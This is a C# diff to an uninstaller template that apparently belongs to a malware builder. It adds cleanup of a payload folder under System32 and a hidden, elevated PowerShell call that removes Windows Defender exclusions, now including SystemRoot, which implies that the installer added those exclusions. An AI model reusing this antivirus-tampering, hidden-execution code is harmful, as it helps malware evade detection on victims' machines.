@@ -1,6 +1,7 @@
 ﻿using System;
 using System.IO;
 using System.Reflection;
+using System.Security.Principal;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -17,9 +18,12 @@ using System.Windows.Forms;
 
 [assembly: Guid("%Guid%")]
 
-public partial class Uninstaller
+public partial class RUninstaller
 {
     public static string rbD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH");
+#if DefSystem32
+    public static string rbD2 = Environment.SystemDirectory + @"\" + RGetString("#LIBSPATH");
+#endif
 
     public static void Main()
     {
@@ -110,6 +114,9 @@ public partial class Uninstaller
         try
         {
             Directory.Delete(rbD, true);
+#if DefSystem32
+            Directory.Delete(rbD2, true);
+#endif
 #if DefInstall
             File.Delete(PayloadPath);
 #endif
@@ -128,7 +135,7 @@ public partial class Uninstaller
             Process.Start(new ProcessStartInfo
             {
                 FileName = "cmd",
-                Arguments = "/c powershell -Command Remove-MpPreference -ExclusionPath '%cd%' & powershell -Command Remove-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Remove-MpPreference -ExclusionPath '%AppData%' & powershell -Command Remove-MpPreference -ExclusionPath '%Temp%' & exit",
+                Arguments = "/c powershell -Command Remove-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Remove-MpPreference -ExclusionPath '%AppData%' & powershell -Command Remove-MpPreference -ExclusionPath '%Temp%' & powershell -Command Remove-MpPreference -ExclusionPath '%SystemRoot%' & exit",
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
                 Verb = "runas"
